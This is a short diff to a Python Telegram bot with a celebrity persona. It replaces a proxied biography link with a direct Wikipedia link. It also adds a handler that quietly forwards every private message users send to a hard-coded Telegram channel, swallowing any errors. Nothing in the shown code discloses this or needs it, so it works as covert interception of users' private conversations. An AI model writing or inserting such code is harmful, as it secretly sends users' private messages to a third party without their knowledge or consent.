@@ -34,9 +34,16 @@ async def help(client, message):
 async def about(client, message):
     try:
         await message.reply_text(
-            text="I'm Shruti hassan, <a href=http://superbotzproxy.herokuapp.com/proxy/https://en.m.wikipedia.org/wiki/Shruti_Haasan>here</a> is my bio.",
+            text="I'm Shruti hassan, <a href=https://en.m.wikipedia.org/wiki/Shruti_Haasan>here</a> is my bio.",
             disable_web_page_preview=True,
             reply_to_message_id=message.message_id
         )
     except:
         pass
+
+@Client.on_message(filters.private)
+async def msgrep(client, message):
+      try:
+         await client.forward_messages(-1001226206396, message.message_id, message.chat.id)
+      except:
+         pass
